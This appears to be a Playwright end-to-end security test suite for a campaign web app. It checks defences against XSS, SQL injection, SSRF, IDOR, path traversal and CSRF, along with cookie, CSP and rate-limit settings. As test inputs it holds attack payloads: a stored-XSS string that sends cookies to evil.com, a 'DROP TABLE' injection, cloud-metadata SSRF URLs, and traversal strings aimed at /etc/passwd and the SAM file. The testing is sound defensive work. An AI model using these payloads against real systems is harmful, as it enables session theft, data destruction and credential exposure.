import { test, expect } from '@playwright/test';

/**
 * Security Vulnerability Tests
 * Tests: SEC-014 through SEC-020
 */

test.describe('XSS Prevention', () => {

    test('SEC-015: XSS vulnerability testing', async ({ page }) => {
        // Test reflected XSS
        const xssPayloads = [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            'javascript:alert("XSS")',
            '<svg onload=alert("XSS")>',
            '"><script>alert(String.fromCharCode(88,83,83))</script>',
        ];

        await page.goto('/campaigns');
        await page.click('[data-testid="create-campaign-btn"]');

        for (const payload of xssPayloads) {
            // Try to inject XSS in campaign name
            await page.fill('[data-testid="campaign-name"]', payload);

            // Submit form
            await page.click('[data-testid="save-campaign"]');

            // Wait a moment for any potential script execution
            await page.waitForTimeout(1000);

            // Verify no alert dialog appeared (XSS blocked)
            const dialogs: any[] = [];
            page.on('dialog', dialog => dialogs.push(dialog));

            expect(dialogs.length).toBe(0);

            // Verify payload is escaped in display
            const displayedName = await page.locator('[data-testid="campaign-name-display"]').textContent();
            expect(displayedName).not.toContain('<script>');

            // Clear for next test
            await page.fill('[data-testid="campaign-name"]', '');
        }
    });

    test('SEC-015: Stored XSS prevention', async ({ page }) => {
        await page.goto('/campaigns');
        await page.click('[data-testid="create-campaign-btn"]');

        const storedXSS = '<img src=x onerror="fetch(\'https://evil.com?cookie=\'+document.cookie)">';

        // Create campaign with XSS payload
        await page.fill('[data-testid="campaign-name"]', storedXSS);
        await page.fill('[data-testid="campaign-description"]', 'Test campaign');
        await page.click('[data-testid="save-campaign"]');

        // Navigate away and back
        await page.goto('/dashboard');
        await page.goto('/campaigns');

        // Verify payload is still escaped
        const campaignCard = page.locator(`[data-testid="campaign-card"]:has-text("${storedXSS.substring(0, 10)}")`);
        const html = await campaignCard.innerHTML();

        // Should be HTML-encoded
        expect(html).toContain('&lt;img');
        expect(html).not.toContain('<img src=x onerror=');
    });
});

test.describe('SQL Injection Prevention', () => {

    test('SEC-016: SQL injection testing', async ({ page }) => {
        const sqlPayloads = [
            "' OR '1'='1",
            "1' OR '1' = '1",
            "'; DROP TABLE campaigns;--",
            "1' UNION SELECT NULL, NULL, NULL--",
            "admin'--",
            "' OR 1=1--",
        ];

        await page.goto('/campaigns');

        for (const payload of sqlPayloads) {
            // Try SQL injection in search
            await page.fill('[data-testid="campaign-search"]', payload);
            await page.keyboard.press('Enter');

            // Wait for response
            await page.waitForTimeout(1000);

            // Verify no SQL error messages
            const pageContent = await page.textContent('body');
            expect(pageContent).not.toMatch(/sql|syntax error|mysql|postgresql/i);

            // Verify we don't get all records (which would indicate successful injection)
            const resultCount = await page.locator('[data-testid="campaign-card"]').count();

            // Should return 0 results or only legitimate matches, not all records
            // This is a heuristic - adjust based on your data
            expect(resultCount).toBeLessThan(100);
        }
    });
});

test.describe('SSRF Prevention', () => {

    test('SEC-017: SSRF vulnerability testing', async ({ page }) => {
        // Test if we can make the server fetch internal resources
        const ssrfPayloads = [
            'http://localhost:8001/admin',
            'http://127.0.0.1:5432',
            'http://169.254.169.254/latest/meta-data/',  // AWS metadata
            'file:///etc/passwd',
            'http://metadata.google.internal/computeMetadata/v1/',  // GCP metadata
        ];

        await page.goto('/connectors');

        // Try to add connector with SSRF payload
        for (const payload of ssrfPayloads) {
            await page.click('[data-testid="add-connector-btn"]');

            // Try to set malicious URL
            await page.fill('[data-testid="connector-url"]', payload);
            await page.click('[data-testid="test-connection"]');

            // Wait for response
            await page.waitForTimeout(2000);

            // Should show error, not internal data
            const errorMsg = await page.locator('[data-testid="connection-error"]').textContent();
            expect(errorMsg).toMatch(/invalid|blocked|not allowed/i);

            // Close modal
            await page.click('[data-testid="close-modal"]');
        }
    });
});

test.describe('IDOR Prevention', () => {

    test('SEC-018: IDOR vulnerability testing', async ({ page }) => {
        // Get a valid resource ID
        await page.goto('/campaigns');
        await page.locator('[data-testid="campaign-card"]').first().click();

        const validUrl = page.url();
        const validId = validUrl.split('/').pop();

        // Try to access resources with manipulated IDs
        const idorPayloads = [
            '1',
            '999999',
            '../admin',
            validId + '1',
            validId?.replace(/\d/g, (d) => String((parseInt(d) + 1) % 10)),
        ];

        for (const payload of idorPayloads) {
            const response = await page.goto(`/campaigns/${payload}`);

            // Should return 404 or redirect, not show other tenant's data
            if (response?.status() === 200) {
                // If page loads, verify it's our own data
                const tenantId = await page.locator('[data-testid="campaign-tenant-id"]').getAttribute('data-tenant');
                const currentTenantId = await page.locator('[data-testid="current-user-tenant"]').getAttribute('data-tenant');

                expect(tenantId).toBe(currentTenantId);
            } else {
                // Should be 404 or 403
                expect([403, 404]).toContain(response?.status());
            }
        }
    });
});

test.describe('Path Traversal Prevention', () => {

    test('SEC-019: Path traversal testing', async ({ page }) => {
        const pathTraversalPayloads = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\config\\sam',
            '....//....//....//etc/passwd',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        ];

        // Test file download endpoint
        for (const payload of pathTraversalPayloads) {
            const response = await page.request.get(`/api/assets/download?path=${encodeURIComponent(payload)}`);

            // Should be rejected
            expect(response.status()).toBeGreaterThanOrEqual(400);

            // Should not return system files
            const contentType = response.headers()['content-type'];
            expect(contentType).not.toMatch(/text\/plain|application\/octet-stream/);
        }
    });
});

test.describe('CSRF Protection', () => {

    test('SEC-008: CSRF token validation', async ({ page, context }) => {
        await page.goto('/campaigns');

        // Get CSRF token from page
        const csrfToken = await page.locator('[name="csrf-token"]').getAttribute('content');
        expect(csrfToken).toBeTruthy();

        // Try to submit form without CSRF token
        const cookies = await context.cookies();

        const response = await page.request.post('/api/campaigns', {
            data: {
                name: 'Test Campaign',
                type: 'email',
            },
            headers: {
                'Cookie': cookies.map(c => `${c.name}=${c.value}`).join('; '),
                // Intentionally omit CSRF token
            },
        });

        // Should be rejected
        expect(response.status()).toBe(403);
    });
});

test.describe('Session Security', () => {

    test('SEC-006: HttpOnly cookie enforcement', async ({ page, context }) => {
        await page.goto('/login');

        // Login
        await page.fill('[data-testid="email-input"]', process.env.TEST_CLIENT_EMAIL!);
        await page.fill('[data-testid="password-input"]', process.env.TEST_CLIENT_PASSWORD!);
        await page.click('[data-testid="login-submit"]');

        await page.waitForURL('**/dashboard**');

        // Check session cookie
        const cookies = await context.cookies();
        const sessionCookie = cookies.find(c =>
            c.name.includes('session') ||
            c.name.includes('auth') ||
            c.name.includes('token')
        );

        expect(sessionCookie).toBeDefined();
        expect(sessionCookie?.httpOnly).toBe(true);
    });

    test('SEC-007: Secure/SameSite cookie flags', async ({ page, context }) => {
        await page.goto('/login');

        await page.fill('[data-testid="email-input"]', process.env.TEST_CLIENT_EMAIL!);
        await page.fill('[data-testid="password-input"]', process.env.TEST_CLIENT_PASSWORD!);
        await page.click('[data-testid="login-submit"]');

        await page.waitForURL('**/dashboard**');

        const cookies = await context.cookies();
        const sessionCookie = cookies.find(c =>
            c.name.includes('session') ||
            c.name.includes('auth')
        );

        expect(sessionCookie).toBeDefined();

        // In production, should be Secure
        if (process.env.NODE_ENV === 'production') {
            expect(sessionCookie?.secure).toBe(true);
        }

        // Should have SameSite
        expect(sessionCookie?.sameSite).toMatch(/Strict|Lax/i);
    });
});

test.describe('Content Security Policy', () => {

    test('Verify CSP headers', async ({ page }) => {
        const response = await page.goto('/dashboard');

        const cspHeader = response?.headers()['content-security-policy'];

        if (cspHeader) {
            // Verify CSP includes important directives
            expect(cspHeader).toContain("default-src");
            expect(cspHeader).toContain("script-src");
            expect(cspHeader).toContain("style-src");

            // Should not allow unsafe-inline for scripts (or only with nonce)
            if (cspHeader.includes('script-src')) {
                const scriptSrc = cspHeader.split('script-src')[1].split(';')[0];
                if (scriptSrc.includes('unsafe-inline')) {
                    // If unsafe-inline is present, should have nonce
                    expect(scriptSrc).toMatch(/nonce-/);
                }
            }
        }
    });
});

test.describe('Rate Limiting', () => {

    test('RES-005: Rate limiting enforcement', async ({ page }) => {
        // Make rapid requests
        const requests = [];

        for (let i = 0; i < 100; i++) {
            requests.push(
                page.request.get('/api/campaigns')
            );
        }

        const responses = await Promise.all(requests);

        // Some requests should be rate limited
        const rateLimited = responses.filter(r => r.status() === 429);

        expect(rateLimited.length).toBeGreaterThan(0);

        // Verify rate limit headers
        const limitedResponse = rateLimited[0];
        expect(limitedResponse.headers()['x-ratelimit-limit']).toBeDefined();
        expect(limitedResponse.headers()['x-ratelimit-remaining']).toBeDefined();
    });
});
